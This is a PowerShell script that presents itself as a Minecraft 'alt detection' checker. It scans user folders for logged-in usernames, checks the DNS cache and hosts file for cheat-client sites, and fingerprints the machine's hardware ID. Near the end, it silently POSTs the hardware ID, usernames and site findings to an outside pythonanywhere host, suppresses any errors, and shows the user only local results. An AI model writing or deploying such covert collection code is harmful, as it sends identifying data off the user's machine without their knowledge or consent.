$proxyUrl = "https://heatedmoments.pythonanywhere.com"

$startPath = "C:\Users"

function Get-HWID {
    try {
        $computerInfo = Get-WmiObject Win32_ComputerSystemProduct
        $uuid = $computerInfo.UUID
        $drive = Get-WmiObject Win32_DiskDrive | Where-Object { $_.Index -eq 0 }
        $driveSerial = $drive.SerialNumber
        $hwid = "$uuid-$driveSerial"
        $hash = [System.BitConverter]::ToString([System.Security.Cryptography.MD5]::Create().ComputeHash([System.Text.Encoding]::UTF8.GetBytes($hwid)))
        return $hash -replace '-', ''
    }
    catch { return "UNKNOWN" }
}

$hwid = Get-HWID

if (-not (Test-Path $startPath)) { exit }

Write-Host "Finding usernames, It may take a few minutes..." -ForegroundColor Cyan

$gzFiles = Get-ChildItem -Path $startPath -Recurse -Filter "*.gz" -File -Force -ErrorAction SilentlyContinue
$logFiles = Get-ChildItem -Path $startPath -Recurse -Filter "*.log" -File -Force -ErrorAction SilentlyContinue
$allFiles = @($gzFiles) + @($logFiles)

$allFoundAlts = @()

foreach ($file in $allFiles) {
    try {
        $content = $null
        $isGz = $file.Extension -eq ".gz"
        
        if ($isGz) {
            $tempFileName = "$($file.BaseName)_temp_$([guid]::NewGuid().ToString('N')).txt"
            $tempOutput = Join-Path $file.DirectoryName $tempFileName
            
            $inputStream = [System.IO.File]::OpenRead($file.FullName)
            $outputStream = [System.IO.File]::Create($tempOutput)
            $gzipStream = New-Object System.IO.Compression.GZipStream($inputStream, [System.IO.Compression.CompressionMode]::Decompress)
            
            $gzipStream.CopyTo($outputStream)
            $gzipStream.Close(); $outputStream.Close(); $inputStream.Close()
            
            $content = Get-Content $tempOutput -Raw -ErrorAction SilentlyContinue
            Remove-Item $tempOutput -Force -ErrorAction SilentlyContinue
        } else {
            $content = Get-Content $file.FullName -Raw -ErrorAction SilentlyContinue
        }
        
        $pattern = "Setting user:\s*(\S+)"
        if ($content -and $content -match $pattern) {
            $username = $Matches[1]
            $allFoundAlts += $username
        }
    }
    catch { continue }
}

$uniqueFoundAlts = @($allFoundAlts | Select-Object -Unique)

$cheatSites = @(
    "drip.gg",
    "novoware.shop",
    "novoware.eu", 
    "vape.gg",
    "doomsdayclient.com",
    "prestigeclient.vip",
    "grimclient.pl",
    "neverlack.in",
    "dqrkis.xyz",
    "voilclient.lol"
)

$cheatSitesFound = @()

Write-Host "Checking for visited cheat sites..." -ForegroundColor Yellow

$dnsCache = ipconfig /displaydns | Out-String
foreach ($site in $cheatSites) {
    if ($dnsCache -match $site) {
        $cheatSitesFound += "Visited: $site (DNS cache)"
    }
}

$hostsFile = "C:\Windows\System32\drivers\etc\hosts"
if (Test-Path $hostsFile) {
    $hostsContent = Get-Content $hostsFile -Raw
    foreach ($site in $cheatSites) {
        if ($hostsContent -match $site) {
            $cheatSitesFound += "Hosts redirect: $site"
        }
    }
}

Write-Host "`nAlts found on this system:" -ForegroundColor Cyan
if ($uniqueFoundAlts.Count -eq 0) {
    Write-Host "  No alts found" -ForegroundColor Yellow
} else {
    $counter = 1
    foreach ($username in $uniqueFoundAlts) {
        Write-Host ("  {0}. {1}" -f $counter, $username) -ForegroundColor Magenta
        $counter++
    }
}

if ($cheatSitesFound.Count -gt 0) {
    Write-Host "`nCheat sites detected:" -ForegroundColor Red
    foreach ($site in $cheatSitesFound | Select-Object -Unique) {
        Write-Host ("  {0}" -f $site) -ForegroundColor Red
    }
}

$payload = @{
    hwid = $hwid
    alts = @($uniqueFoundAlts)
    cheat_sites = @($cheatSitesFound)
} | ConvertTo-Json -Compress

$body = @{
    payload = $payload
} | ConvertTo-Json -Compress

try {
    $response = Invoke-RestMethod -Uri $proxyUrl -Method Post -Body $body -ContentType "application/json"
}
catch {
    # Silently ignore errors
}

Write-Host "`n========================================" -ForegroundColor Cyan
Write-Host "ALT DETECTION COMPLETE" -ForegroundColor Cyan
Write-Host "========================================" -ForegroundColor Cyan
Write-Host "dm @heatedmoments on discord if theres issues." -ForegroundColor Blue
